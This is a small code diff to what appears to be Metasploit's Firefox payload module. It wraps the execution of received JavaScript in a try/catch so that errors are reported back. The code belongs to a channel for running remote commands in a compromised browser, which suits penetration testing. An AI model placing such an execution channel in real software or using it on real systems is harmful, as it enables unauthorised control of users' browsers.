@@ -88,15 +88,18 @@ module Msf::Payload::Firefox
           var tag = "[!JAVASCRIPT]";
           var sync = true;  // avoid zalgo's reach
           var sent = false;
+          var retVal = null;
 
-          var retVal = Function('send', js[1])(function(r){
-            if (sent) return;
-            sent = true
-            if (r) {
-              if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
-              else      cb(false, r+tag+"\\n");
-            }
-          });
+          try {
+            retVal = Function('send', js[1])(function(r){
+              if (sent) return;
+              sent = true
+              if (r) {
+                if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
+                else      cb(false, r+tag+"\\n");
+              }
+            });
+          } catch (e) { retVal = e.message; }
 
           sync = false;
 
